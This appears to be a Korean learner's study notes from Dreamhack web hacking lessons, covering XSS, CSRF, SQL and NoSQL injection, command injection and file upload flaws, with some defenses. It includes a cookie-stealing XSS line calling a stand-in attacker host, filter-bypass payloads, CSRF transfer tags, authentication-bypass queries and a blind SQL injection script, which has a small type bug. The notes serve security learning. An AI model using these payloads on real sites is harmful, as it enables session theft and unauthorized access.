# 웹 해킹 개요  
웹 해킹은 해킹의 의미처럼 본래의 의도와는 다른 동작을 일으키도록 하거나, 주어진 권한 이상으로 정보를 열람, 복제, 변경 가능한 행위가 웹에서 발생하는 것.  

기업의 업무, 금융, 쇼핑 등 다양한 분야가 웹으로 서비스되면서 제공하는 서비스의 복잡도와 다양성이 증가.  
그로 인해 서버와 어플리케이션에서 처리하는 사용자의 입력 역시 다양해졌고 기능을 구현하면서 높아진 복잡도로 인해  
개발 당시에는 의도치 않았던 동작을 일으킬 수 있는 웹 해킹의 위협도 증가.  

많은 기업들이 자산을 보호하기 위해 많은 서비스와 네트워크 망을 내부망에서 사용하지만, 기업의 대표 사이트 또는 제품(서비스) 등과 같이 웹을 통해 서비스를 운영하는 경우가 많음.  
이런 웹 서비스들은 내부망과 연결되어 있을 가능성이 높아 공격자들이 내부망 침투를 위해 가장 먼저 웹을 공격하기도 함.  

## 웹 해킹 공격 벡터  
<img width="470" alt="4" src="https://user-images.githubusercontent.com/46364778/93002223-6f429c00-f570-11ea-903e-541668ed6325.PNG">  

드림핵 웹사이트 접속 시 발생하는 과정 간략히 표현  
* Client-side : 사용자의 입력을 받고 웹사이트와 통신  
* Server-side : 사용자의 요청 처리  

웹 해킹을 할 때에도 Client-side, Server-side로 공격 대상을 나누어볼 수 있다.  
공격 대상에 따라 공격하는 방식, 형태가 달라지며 공격을 통해 가능한 행위가 달라짐.  

### Client-side Attack  
서비스 사용자에 대한 공격  

웹을 이용하는 사용자는 웹브라우저를 통해 서비스 제공 받는데  
**웹 서버가 제공해주는 데이터**가 공격자에 의해 변조되었을 경우  
**웹 브라우저에서 렌더되는 과정**에서 취약점이 발생하는 경우가 대표적인 공격 형태  
> ex) 게시판 서비스 - 사용자의 입력을 특별한 검증 없이 출력하게 되면 사용자의 입력도 html처럼 취급되고 스크립트도 삽입 가능  
이를 악용하여 공격자는 다른 사용자의 웹 브라우저에 원하는 행위 수행 가능  

### Server-side Attack  
서비스를 운용하는 서버에 대한 공격  

다양한 공격 형태 존재, 공격자가 공격에 성공하게 되면 서버의 어플리케이션 코드 또는 다른 사용자의 정보 유출, 서버 탈취 등의 공격으로 발전될 수 있다.  
운영되는 서비스의 구조와 특징에 따라 위협의 형태가 달라짐.  
> 서비스의 형태에 따라 가지게 되는 특별한 공격 방법이 존재.  
ex) 송금 기능을 지원하는 서비스에서 자신이 가진 금액보다 더 큰 금액으로 요청하게 될 때 특별한 검증 절차 없이 정상적으로 진행된다며, 공격자는 금전적 이득 취득 가능  


## Client: 세션 하이재킹(Session Hijacking)  
쿠키에는 세션 정보가 저장되어 있고 서버는 이를 통해 이용자를 식별하고 인증을 처리함.  
공격자가 이용자의 쿠키를 훔칠 수 있으면 세션에 해당하는 이용자의 인증 상태를 훔칠 수 있는데, 이를 세션 하이재킹이라고 한다.  

드림핵 로그인 기능을 통해 세션을 알아보자.  
> 1. 드림핵 로그인 페이지에서 우클릭 후 검사를 클릭하고 Network 탭을 누릅니다.  
> Preserve log를 체크하고 로그인을 하면 로그인 성공 시 응답을 볼 수 있습니다.  
> 응답을 살펴보면, 서버에서 set-cookie 헤더를 통해 브라우저의 쿠키에 세션 정보를 저장하는 것을 볼 수 있습니다.  
> 2. 크롬 검사에서 Application을 누르고 Cookies 목록 안의 https://dreamhack.io 를 누르면 서버의 set-cookie 헤더를 통해 설정된 쿠키를 확인할 수 있습니다.  
> 3. sessionid 헤더의 값을 메모장에 복사합니다.  
> 이후 사진과 같이 sessionid 헤더의 값을 우클릭한 후 Delete를 클릭하면 브라우저의 쿠키에 저장된 세션 값이 삭제됩니다.  
> 세션 값을 삭제하고 드림핵 페이지를 새로고침하면 로그인이 풀려있는 것을 확인할 수 있습니다.
> 4. 쿠키의 빈 칸을 더블 클릭해 sessionid 헤더를 추가하고, 이전에 복사한 세션 값을 입력하면 브라우저의 쿠키에 세션 값이 설정됩니다.  
> 세션 값을 설정하고 드림핵 페이지를 새로고침하면 로그인이 되는 것을 확인할 수 있습니다.  

## Client: Same Origin Policy  
쿠키, 세션 하이재킹을 방지하기 위해 동일 출처 정책, Same Origin Policy(SOP) 보안 매커니즘이 탄생.  
SOP는 클라이언트 사이드 웹 보안에 있어 중요한 요소.  
실제로 클라이언트 사이드 공격은 이 SOP를 우회하기 위한 것이라고 해도 과언이 아님.  
> 브라우저는 인증 정보로 사용될 수 있는 쿠키를 브라우저 내부에 저장.  
> 이용자가 웹 서비스에 접속할 때, 브라우저는 해당 웹 서비스에서 사용하는 인증 정보인 쿠키를 HTTP 정보에 포함시켜 전달.  
> 뿐만 아니라, 브라우저는 웹 리소스를 통해 간접적으로 타 사이트에 접근할 때도 인증 정보인 쿠키를 함께 전송하는 특징을 가지고 있음.  

클라이언트 입장에서는 가져온 데이터를 악의적인 페이지에서 읽을 수 없도록 해야함. 이것이 바로 SOP.  

### ORIGIN 구분 방법  
ORIGIN은 프로토콜(Protocol Scheme), 포트(Port), 호스트(Host)로 구성. 구성요소가 모두 일치해야 동일한 오리진이라고 함.  
ex) https://same-origin.com/  
|URL|결과|이유|  
|:----:|:---:|:---:|  
|https://same-origin.com/frame.html|Same Origin|Path만 다름|  
|http://same-origin.com/frame.html|Cross Origin|Scheme이 다름|  
|https://cross.same-origin.com/frame.html|Cross Origin|Host가 다름|  
|https://same-origin.com:1234/|Cross Origin|Port가 다름|  

SOP는 Cross Origin이 아닌 Same Origin 일 때만 정보를 읽을 수 있도록 해줌.  
외부 출처에서 불러온 데이터를 읽으려고 할 때는 오류가 발생.  
하지만 읽는 것 외에 데이터를 쓰는 것은 문제 없이 작동.  

### Cross Origin Resource SHaring(CORS)  
브라우저가 SOP에 구애 받지 않고 외부 출처에 대한 접근을 허용해주는 경우가 존재.  
ex) 이미지, 자바스크립트, CSS 등 리소스를 불러오는 \<img\>, \<style\>, \<script\> 등의 태그  
그리고 웹 서비스에서 동일 출처 정책인 SOP를 완화하여 다른 출처의 데이터를 처리해야하는 경우도 있음.  

위 같은 상황에서 자원을 공유하기 위해 사용할 수 있는 공유 방법을 교차 출처 리소스 공유(CORS)라고 함.  
CORS 방법은 관련된 HTTP 헤더를 추가하여 전송하는 방법. 이 외에도 JSON with Padding(JSONP) 방법을 통해 CORS를 대체할 수 있음.  

* HTTP 헤더에 기반  
발신 측에서 CROS 헤더를 설정해 요청하면, 수신 측에서 헤더를 구분해 정해진 규칙에 맞게 데이터를 가져갈 수 있도록 설정.  
> 발신 측에서 POST 방식으로 HTTP를 보냈으나, OPTIONS 메소드를 가진 HTTP 요청이 전달됨.  
> 이를 **CORS preflight**: 수신 측에 웹 리소스를 요청해도 되는지 질의하는 과정  

|Header|설명|  
|:---:|:---:|  
|Access-Control-Allow-Origin|헤더 값에 해당하는 Origin에서 들어오는 요청만 처리합니다.|  
|Access-Control-Allow-Methods|헤더 값에 해당하는 메소드의 요청만 처리합니다.|  
|Access-Control-Allow-Credentials|쿠키 사용 여부를 판단합니다. 예시의 경우 쿠키의 사용을 허용합니다.|  
|Access-Control-Allow-Headers|헤더 값에 해당하는 헤더의 사용 가능 여부를 나타냅니다.|  

> 브라우저는 수신측의 응답이 발신측의 요청과 상응하는지 확인하고, 그때야 비로소 POST 요청을 보내 수신측의 웹 리소스를 요청하는 HTTP 요청을 보냅니다.  

* JSONP  
이미지나 자바스크립트, CSS 등의 리소스는 SOP에 구애 받지 않고 외부 출처에 대해 접근을 허용.  
JSONP 방식은 이러한 특징을 이용해 \<script\> 태그로 Cross Origin의 데이터를 불러온다.  
하지만 \<script\> 태그 내에서는 데이터를 자바스크립트의 코드로 인식하기 때문에 Callback 함수를 활용해야 함!  
Cross Origin에 요청할 때 callback 파라미터에 어떤 함수로 받아오는 데이터를 핸들링할지 넘겨주면, 대상 서버는 전달된 Callback으로 데이터를 감싸 응답.  

> 웹 리소스 요청 코드  
```
<script>
/* myCallback이라는 콜백 함수를 지정합니다. */
function myCallback(data){
    /* 전달받은 인자에서 id를 콘솔에 출력합니다.*/
	console.log(data.id)
}
</script>
<!--
https://theori.io의 스크립트를 로드하는 HTML 코드입니다.
단, callback이라는 이름의 파라미터를 myCallback으로 지정함으로써
수신측에게 myCallback 함수를 사용해 수신받겠다고 알립니다.
-->
<script src='http://theori.io/whoami?callback=myCallback'></script>
```

> 웹 리소스 요청에 따른 응답 코드  
```
/*
수신측은 myCallback 이라는 함수를 통해 요청측에 데이터를 전달합니다.
전달할 데이터는 현재 theori.io에서 클라이언트가 사용 중인 계정 정보인
{'id': 'dreamhack'} 입니다. 
*/
myCallback({'id':'dreamhack'});
```

예시 코드 동작을 함께 살펴보자.  
13 번째 줄에서 Cross Origin의 데이터를 불러온다.  
이 때 callback 파라미터로 myCallback을 함께 전달한다.  
Cross Origin에서는 응답할 데이터를 myCallback 함수의 인자로 전달될 수 있도록 myCallback으로 감싸 Javascript 코드를 반환해준다.  
반환된 코드는 요청측에서 실행되기 때문에 3~6번 줄에서 정의된 myCallback 함수가 전달된 데이터를 읽을 수 있음.  

다만 JSONP는 CORS가 생기기 전에 사용하던 방법으로 현재는 거의 사용하지 않는 추세, 새롭게 코드를 작성할 때에는 CORS를 사용해야 함.  

## Client: Cross Site Scripting(XSS)  
공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하도록 함.  
해당 취약점을 통해 특정 계정의 세션 정보 탈취, 해당 계정으로 임의의 기능 수행 가능.  
> 해당 페이지에 접속하면 오리진 사이트가 명령한 것으로 해석하고 악성 스크립트 실행  

### XSS 발생 예시와 종류  
XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생  
ex) 로그인 시 출력되는 "안녕하세요 00회원님" 같은 문구, 게시글, 댓글  

클라이언트는 HTTP 형식으로 웹 서버에 리소스를 요청하고 서버로부터 받은 응답, 즉 HTML, CSS, JS 등의 웹 리소스를 시각화하여 이용자에게 보여줌.  
이때, HTML, CSS, JS와 같은 코드가 포함된 게시물을 조회할 경우 이용자는 변조된 페이지를 보거나 스크립트가 실행될 수 있음.  

XSS는 발생 형태에 따라서 다양한 종류로 구분  

|종류|설명|  
|:---:|:---:|  
|Stored XSS|XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS|  
|Reflected XSS|XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS|  
|DOM-based XSS|XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS. (Fragment는 서버 요청/응답 에 포함되지 않습니다.)|  
|Universal XSS|클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS|  

### XSS 스크립트의 예시  
자바스크립트는 웹 문서의 동작을 정의. 공격자는 자바스크립트를 통해 이용자에게 보여지는 웹 페이지를 조작하거나, 웹 브라우저의 위치를 임의의 주소로 변경할 수 있음.  
자바스크립트는 다양한 동작을 정의할 수 있기 때문에 XSS 공격에 주로 사용됨. 실행하기 위한 태그로는 /<script/>가 있음.  

1. 쿠키 및 세션 탈취 공격 코드  
```
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```  

2. 페이지 변조 공격 코드  
```
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```  

3. 위치 이동 공격 코드  
```
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```  

### Stored XSS  
서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성스크립트를 조회할 때 발생하는 XSS  
대표적으로 게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있음.  
게시물은 불특정 다수에게 보여지기 때문에 해당 기능에서 XSS 취약점이 존재할 경우 높은 파급력을 가짐.  
ex) 실습하면서 배운 것: 글 쓸 때 body(게시글) 부분에 써야 실행되는 듯 함. 제목 부분은 X.  

### Reflected XSS  
서버가 악성 스크립트가 담긴 요청을 출력하라 때 발생하는 XSS  
대표적으로 게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서, 스크립트를 포함해 검색하는 방식이 있음.  
이용자가 게시물을 검색하면 서버에서는 검색 결과를 이용자에게 반환한다. 일부 서비스에서는 검색 결과를 응답에 포함하는데, 검색 문자열에 악성 스크립트가 포함되어 있다면 Reflected XSS가 발생할 수 있음.  

Reflected XSS는 Stored XSS와 다르게 URL과 같은 이용자의 요청에 의해 발생.  
따라서 공격을 위해서는 타 이용자에게 악성 스크립트가 포함된 링크에 접속하도록 유도해야함.  
이용자에게 링크를 직접 전달하는 방법은 악성 스크립트 포함 여부를 이용자가 눈치챌 수 있기 때문에 주로 **Click Jacking** 또는 **Open Redirect** 등 다른 취약점과 연계하여 사용.  

> 키워드  
> * Cross Site Scripting (XSS): 클라이언트 사이드 취약점, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 취약점  
> * Stored XSS: 악성 스크립트가 서버 내에 존재, 이용자가 저장된 악성 스크립트를 조회할 때 발생  
> * Reflected XSS: 악성 스크립트가 이용자 요청 내에 존재, 이용자가 악성 스크립트가 포함된 요청을 보낸 후 응답을 출력할 때 발생  

### 실습  
render_template 함수는 전달된 템플릿 변수를 기록할 때 HTML 엔티티코드로 변환해 저장하기 때문에 XSS가 발생하지 않음.  
이용자가 입력한 값을 페이지에 그대로 출력하면 XSS가 발생.  

#### 익스플로잇  
엔드포인트에서 발생하는 XSS 취약점을 통해 임의 이용자의 쿠키를 탈취해야 한다.  
탈취한 쿠키를 전달받기 위해서는 외부에서 접근 가능한 웹 서버를 이용하거나 문제에서 제공하는 다른 엔드포인트를 사용할 수 있음.  
* location.href: 전체 URL을 반환하거나, URL을 업데이트할 수 있는 속성값  
* document.cookie: 해당 페이지에서 사용하는 쿠키를 읽고, 쓰는 속성값  

### 방어법  
악성 태그를 필터링하는 HTML Sanitizaion을 사용하거나 엔티티코드로 치환하는 방법을 통해 해결할 수 있음.  

### XSS 우회법  
[치트시트](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)  

> xss-2 문제의 경우 \<script\>가 필터링됨.  
> HTML5의 경우 innerHTML로 들어간 script 태그는 실행되지 않음.([출처](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML))  
```<svg/onload=location["href"]="/memo?memo="+document["cookie"]>```  
```<img src="" onerror="location.href='/memo?memo='+document.cookie">```  

### Client: CSRF(Cross Site Request Forgery)  
이용자의 신원(식별) 정보가 포함된 쿠키는 일종의 **서명**과 같은 역할을 한다.  
클라이언트에서 보내진 요청이 이용자로부터 왔으며, 이용자가 동의 했고, 따라서 요청에 이용자의 권한이 부여돼야함을 의미.  

공백이 있는 문서에 서명하지 말아야함. 왜냐하면 누군가 그 종이에 "나는 A에게 전재산을 양도한다" 따위의 문장을 적어서 위조해도 서명으로 인해 효력을 가질 수 있기 때문.  
CSRF는 위와 비슷하게 이용자를 속여서, 의도지 않은 요청에 동의하게 하는 공격을 말함.  
그럴듯한 웹 페이지를 만들어서 이용자의 입력을 유도하고, 이용자가 값을 입력하면 이를 은행이나 중요 포털 사이트 등으로 전송하여 마치 이용자가 동의한 것 같은 요청을 발생시킴.  
만약, 이용자가 "자동 로그인" 등의 기능을 사용하여 브라우저에 세션 쿠키를 저장하고 있었다면, 실제로 계좌 이체가 발생하거나 비밀번호 초기화가 이뤄질 수도 있음.  

CSRF는 임의 이용자의 권한으로 임의 주소에 HTTP 요청을 보낼 수 있는 취약점.  
CSRF 공격에 성공하기 위해서는 공격자가 작성한 악성 스크립트를 이용자가 실행해야함. ex) 이용자에게 메일을 보내거나 게시판에 글을 작성해 이용자가 이를 조회하도록 유도.  
* CSRF 공격 스크립트(악성 스크립트) -> HTTP 요청을 보내는 코드로 HTML 또는 Javascript를 통해 작성할 수 있음.  
img 태그를 사용하거나 form 태그를 사용하는 방법이 있음. 이 두개의 태그를 사용해 HTTP 요청을 보내면 HTTP 헤더인 Cookie에 이용자의 인증 정보가 포함됨.  

> HTML img, link 태그 공격 코드 예시  
```
<img src='http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337' width=0px height=0px>

<img src=1 onerror="fetch('/sendmoney?to=dreamhack&amount=1337');">

<link rel="stylesheet" href="/sendmoney?to=dreamhack&amount=1337">
```  

> Javascript 공격 코드 예시  
```
/* 새 창 띄우기 */
window.open('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
/* 현재 창 주소 옮기기 */
location.href = 'http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337';
location.replace('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
```  

> CSRF 스크립트 예시  
<img width="610" alt="image" src="https://user-images.githubusercontent.com/46364778/194734440-786793be-02ed-4db4-9eb7-d414df0526b0.png">  

### XSS와 CSRF의 차이  
둘 다 스크립트를 웹 페이지에 작성해 공격한다는 점에서 유사  

#### 공통점  
* 모두 클라이언트를 대상으로 하는 공격  
* 이용자가 악성 스크립트가 포함된 페이지에 접속하도록 유도해야 함.  

#### 차이점  
* 공격에 있어 서로 다른 목적을 가짐  
XSS: 인증 정보인 세션 및 쿠키 탈취를 목적이며 공격할 사이트의 오리진에서 스크립트를 실행시킴.  
CSRF: 이용자가 임의 페이지에 HTTP 요청을 보내는 것을 목적으로 하는 공격. 공격자가 악성 스크립트가 포함된 페이지에 접근한 이용자의 권한으로 웹 서비스의 임의 기능을 실행할 수 있음.  

## Server: SQL Injection  
DBMS에서 사용하는 쿼리를 임의로 조작해 데이터베이스의 정보를 획득하는 SQL Injection  
이용자가 악의적인 입력값을 주입해 의도하지 않은 행위를 일으키는 것을 인젝션이라고 함.  
인증 우회에 사용 가능.  
WHERE 문을 항상 참이도록 만들거나 주석(--, #, /**/) 이용, UNION 등  
```SELECT * FROM user_table WHERE uid='admin' or '1' and upw '';```  
```SELECT * FROM user_table WHERE uid='admin' --' and upw '';```  
```SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"``` : userid 검색 조건 뒤에 or 을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT절을 이용해 두번째 Row인 admin을 반환토록 하는 방식(1번째부터 1개 추출. 첫번째 파라미터는 0 부터 시작)  

> 1. 관리자 계정의 비밀번호를 모른 채로 로그인을 우회하여 풀이하는 방법  
> 2. 관리자 계정의 비밀번호를 알아내고 올바른 경로로 로그인 하는 방법  


### Blind SQL Injection  
질의 결과를 이용자가 화면에서 직접 확인하지 못할 때 참/거짓 반환 결과로 데이터를 획득하는 공격 기법.  
데이터베이스의 데이터를 알아낼 수 있음.  
DBMS가 답변 가능한 형태로 질문하면서 비밀번호를 알아낼 수 있음.  

> ascii: 전달된 문자를 아스키 형태로 반환하는 함수.  
ex) ascii('a') = 97  
> substr: 문자열에서 지정한 위치부터 길이까지의 값을 가져옴. (substr string, position, length)  
ex) substr('ABCD', 2, 2) = 'BC'  

Blind SQL Injection은 한 바이트씩 비교하여 공격하는 방식이기 때문에 다른 공격에 비해 많은 시간을 들여야함.  
이러한 문제를 해결하기 위해서는 공격을 자동화하는 스크립트를 작성하는 방법이 있음.  
> 공격 스크립트 작성에 유용한 라이브러리: 파이썬에서 HTTP 통신을 위한 모듈, **requests** 모듈  
> 해당 모듈은 다양한 메소드를 사용해 HTTP 요청을 보낼 수 있으며 응답 또한 확인 가능  

비밀번호는 알파벳, 숫자, 특수문자로 이뤄짐. => 아스키 범위 32~126  
* Blind SQL Injection 공격 스크립트  
```
#!/usr/bin/python3
import requests
import string
url = 'http://example.com/login' # example URL
params = {
    'uid': '',
    'upw': ''
}
tc = string.ascii_letters + string.digits + string.punctuation # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''
password = ''
for idx in range(0, 20):
    for ch in tc:
        params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        if c.text.find("Login success") != -1:
            password += chr(ch)
            break
print(f"Password is {password}")
```  

### 방어법  
* 이용자의 입력값이 포함된 쿼리를 동적으로 생성하고 사용하면서 발생  
따라서 SQL 데이터를 처리할 때 쿼리문을 직접 생성하는 방식이 아닌 **Prepared Statement**와 **Object Relational Mapping(ORM)** 을 사용해 해결  
**Prepared Statement**: 동적 쿼리가 전달되면 내부적으로 쿼리 분석을 수행해 안전한 쿼리문 생성  

### NoSQL Injection  
역시나 이용자의 입력값이 쿼리에 포함되면서 발생하는 문제점  
MongoDB의 NoSQL Injection의 취약점은 주로 이용자의 입력값에 대한 타입 검증이 불충분할 때 발생  

SQL이 저장하는 데이터 자료형: 문자열, 정수, 날짜, 실수 등  
MongoDB는 이 외에도 오브젝트, 배열 타입을 사용할 수 있음. 그 외 타입은 [공식문서](https://docs.mongodb.com/manual/reference/operator/query/type/)   
오브젝트 타입의 입력값을 처리할 때는 쿼리 연산자를 사용할 수 있는데, 이를 통해 다양한 행위가 가능.  

ex) express 데이터 처리 방식 및 실행 결과  
```
const express = require('express');
const app = express();
app.get('/', function(req,res) {
    console.log('data:', req.query.data);
    console.log('type:', typeof req.query.data);
    res.send('hello world');
});
const server = app.listen(3000, function(){
    console.log('app.listen');
});
```  

```
http://localhost:3000/?data=1234
data: 1234
type: string
http://localhost:3000/?data[]=1234
data: [ '1234' ]
type: object
http://localhost:3000/?data[]=1234&data[]=5678
data: [ '1234', '5678' ] 
type: object
http://localhost:3000/?data[5678]=1234
data: { '5678': '1234' } 
type: object
http://localhost:3000/?data[5678]=1234&data=0000
data: { '5678': '1234', '0000': true } 
type: object
http://localhost:3000/?data[5678]=1234&data[]=0000
data: { '0': '0000', '5678': '1234' } 
type: object
http://localhost:3000/?data[5678]=1234&data[1111]=0000
data: { '1111': '0000', '5678': '1234' } 
type: object
```  

* 연산자 이용해 계정 정보 알아내기  
```
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });
app.get('/query', function(req,res) {
    db.collection('user').find({
        'uid': req.query.uid,
        'upw': req.query.upw
    }).toArray(function(err, result) {
        if (err) throw err;
        res.send(result);
  });
});
const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

```
http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
```  

```
// Post Data(Content-Type: application/json)
{"uid": "admin"}, "upw": {"$ne": "guest"} }
```

### Blind NoSQL Injection  
인증 우회 이외에도 참/거짓 결과를 통해서 데이터베이스의 정보를 알아낼 수 있음.  
MongoDB에서는 ```$regex```, ```$where``` 연산자를 사용  
[정규표현식](https://heannim-world.tistory.com/14)  

|Name|Description|  
|:---:|:---:|  
|$expr|쿼리 언어 내에서 집계 식을 사용할 수 있음|  
|$regex|지정된 정규식과 일치하는 문서 선택|  
|$text|지정된 텍스트 검색|  
|$where|Javascript 표현식을 만족하는 문서와 일치|  

* regex 연산자를 활용한 Blind NoSQL Injection  
^는 문자 시작  
```
> db.user.find({upw: {$regex: "^a"}})
> db.user.find({upw: {$regex: "^b"}})
> db.user.find({upw: {$regex: "^c"}})
...
> db.user.find({upw: {$regex: "^g"}})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```  

* where 연산자와 표현식  
```
> db.user.find({$where:"return 1==1"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
> db.user.find({uid:{$where:"return 1==1"}})
error: {
	"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
	"code" : 17287
}
```  
인자로 전달한 js 표현식 만족하는 데이터 조회. 해당 연산자는 field에서 사용할 수 없는 것을 확인할 수 있음(?)  

* where 연산자와 substring  
```
> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
> db.user.find({$where: "this.upw.substring(0,1)=='c'"})
...
> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```  
첫글자를 비교해 데이터를 알아내는 쿼리  

* Sleep 함수를 통한 Time based Injection  
```
db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
/*
/?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
...
/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
=> 시간 지연 발생.
*/
```  
지연 시간을 통해 참/거짓 결과 확인  
첫 글자를 비교하고 해당 표현식이 참을 반환할 때 sleep 함수 실행  

* Error based Injection  
```
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
error: {
	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
	"code" : 16722
}
// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음
```  
에러를 기반으로 데이터를 알아내는 기법, 올바르지 않은 문법을 입력해 고의로 에러를 발생 시킴.  
upw의 첫글자가 'g'인 경우 올바르지 않은 문법인 asdf를 실행하면서 에러 발생.  

* 비밀번호 길이 획득  
```
{"uid": "admin", "upw": {"$regex":".{5}"}}
=> admin
{"uid": "admin", "upw": {"$regex":".{6}"}}
=> undefined
```  

## Server: Command Injection  
> 이용자의 입력을 시스템 명령어로 실행하게 하는 취약점  

다양한 웹 어플리케이션 제작용 언어는 시스템에 내장되어있는 프로그램을 호출할 수 있는 함수 지원  
PHP-```system``, NodeJS-```child_process```, Python-```os.system``` 등  
이러한 함수는 전달된 인자를 shell 프로그램에 전달해 명령어 실행  
명령어를 실행해주는 함수를 잘못 사용하면 Command Injection 취약점이 됨.  

명령어를 실행하는 함수에 이용자가 임의의 인자를 전달할 수 있을 때 발생.  
이용자의 입력을 제대로 검사하지 않으면 임의 명령어가 실행될 수 있음.  
리눅스 shell 프로그램이 지원하는 다양한 메타 문자 때문!  
```&&```, ```;```, ```|``` 등을 사용하면 여러 개의 명령어를 연속으로 실행시킬 수 있음.  

> 메타문자(Meta Character): Shell 프로그램에서 특수하게 처리하는 문자.  

### 메타문자  
* \`\`  
명령어 치환  
``안에 들어있는 명령어를 실행한 결과로 치환.  
```
$ echo `echo theori`
theori
```

* $()  
명령어 치환  
$()안에 들어있는 명령어를 실행한 결과로 치환됩니다.  
이 문자는 위와 다르게 중복 사용이 가능합니다. (echo $(echo $(echo theori)))  
```
$ echo $(echo theori)
theori
```  

* &&  
명령어 연속 실행  
한 줄에 여러 명령어를 사용하고 싶을 때 사용합니다. 앞 명령어에서 에러가 발생하지 않아야 뒷 명령어를 실행합니다. (Logical And)  
```
$ echo hello && echo theori
hello
theori
```  

* ||  
명령어 연속 실행  
한 줄에 여러 명령어를 사용하고 싶을 때 사용합니다. 앞 명령어에서 에러가 발생해야 뒷 명령어를 실행합니다. (Logical Or)  
```
$ cat / || echo theori
cat: /: Is a directory
theori
```  

* ;  
명령어 구분자  
한 줄에 여러 명령어를 사용하고 싶을 때 사용합니다. ;은 단순히 명령어를 구분하기 위해 사용하며, 앞 명령어의 에러 유무와 관계 없이 뒷 명령어를 실행합니다.  
```
$ echo hello ; echo theori
hello
theori
```  

* |  
파이프  
앞 명령어의 결과가 뒷 명령어의 입력으로 들어갑니다.  
```
$ echo id | /bin/sh
uid=1001(theori) gid=1001(theori) groups=1001(theori)
```  

### 방어법  
취약점 발생 원인은 단순하지만, 매우 치명적인 공격으로 이어질 수 있음!  
개발자는 이용자의 입력을 반드시 검사, 되도록 system 함수 사용을 자제해야함.  
* 입력값에 대해 메타 문자의 유무 철저히 검사  
* 시스템 메타 문자를 해석하지 않고 그대로 사용하는 함수 사용  

## Server: File Vulnerability  
파일 공유 서비스를 개발할 때, 이용자가 업로드한 파일을 데이터베이스에 저장하는 것보다는 **서버의 파일 시스템**에 저장하는 것이 개발하기 쉽고, 관리 효율도 높음.  
그러나 임의의 파일이 다운로드 되는 취약점이나, 악성 웹셀 파일을 업로드하여 임의 코드를 실행할 수 있는 취약점 발생시키기도 함.  

### File Upload Vulnerability  
* 파일 업로드와 관련해서 발생하는 취약점  
* CGI로 실행되는 파일을 업로드해서 시스템에 임의 명령어를 실행  
* HTML로 해석되는 파일을 업로드하여 XSS 공격 수행  
* Path Traversal 취약점과 연계하여 업로드 폴더를 벗어난 곳에 공격자의 파일을 저장하는 공격  

